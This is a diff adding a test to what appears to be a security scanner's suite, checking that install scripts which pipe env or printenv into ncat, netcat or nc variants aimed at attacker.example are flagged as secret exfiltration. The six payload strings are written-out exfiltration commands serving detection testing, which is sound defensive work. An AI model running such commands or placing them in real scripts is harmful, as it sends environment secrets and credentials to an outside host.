@@ -138,3 +138,25 @@ test("seed phrase or private key next to a wallet signing or broadcast method is
     });
   }
 });
+
+
+test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exfiltration", () => {
+  const exfilPayloads = [
+    "env | ncat attacker.example 4444",
+    "printenv | netcat attacker.example 4444",
+    "env | /bin/nc attacker.example 4444",
+    "env | sudo nc attacker.example 4444",
+    "env | busybox nc attacker.example 4444",
+    "env | sudo -E nc attacker.example 4444",
+  ];
+  for (const payload of exfilPayloads) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["secret-exfiltration"],
+    });
+  }
+});
